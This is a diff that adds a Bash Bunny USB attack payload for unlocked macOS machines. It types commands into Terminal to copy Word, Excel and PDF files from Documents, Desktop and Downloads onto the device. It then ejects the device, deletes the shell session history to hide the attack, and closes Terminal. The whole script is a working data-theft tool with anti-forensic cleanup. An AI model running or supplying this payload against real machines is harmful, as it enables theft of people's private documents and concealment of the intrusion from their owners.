@@ -1,0 +1,78 @@
+#!/bin/bash
+#
+# Title:         MacDocsExfill
+# Author:        afsh4ck
+# Version:       1.0
+# Target:        MacOS
+# Category:      Exfiltration
+#
+# Exfilter all the documents like excel or pdfs from the principal folders on unlocked MacOS targets.
+# Stashes them in /loot/MacDocsExfill
+#
+# Purple             Setup
+# Amber..............Attack Mode ON
+# Green..............Finished
+
+LED SETUP
+ATTACKMODE HID STORAGE ECM_ETHERNET
+GET TARGET_HOSTNAME
+QUACK DELAY 1000
+
+lootdir=loot/MacDocsExfill/$TARGET_HOSTNAME
+mkdir -p /root/udisk/$lootdir
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 2000
+
+LED STAGE 1
+
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Documents;
+QUACK ENTER
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Desktop;
+QUACK ENTER
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Downloads;
+QUACK ENTER
+QUACK STRING rsync -av Documents/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Documents ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Desktop/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Desktop ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Downloads/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Downloads ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+
+# Ensure sincronization
+sync
+
+# Cleanup and delete proofs
+LED STAGE 2
+QUACK ENTER
+
+# Eject BB storage
+QUACK STRING diskutil eject /Volumes/BashBunny/
+QUACK ENTER
+QUACK DELAY 500
+
+# Remove terminal history from current session (commands used in attack won't be visible with the history command)
+QUACK STRING rm -r ~/.zsh_sessions
+QUACK ENTER
+QUACK DELAY 500
+
+# Exit terminal
+QUACK STRING killall Terminal
+QUACK ENTER
+
+LED FINISH
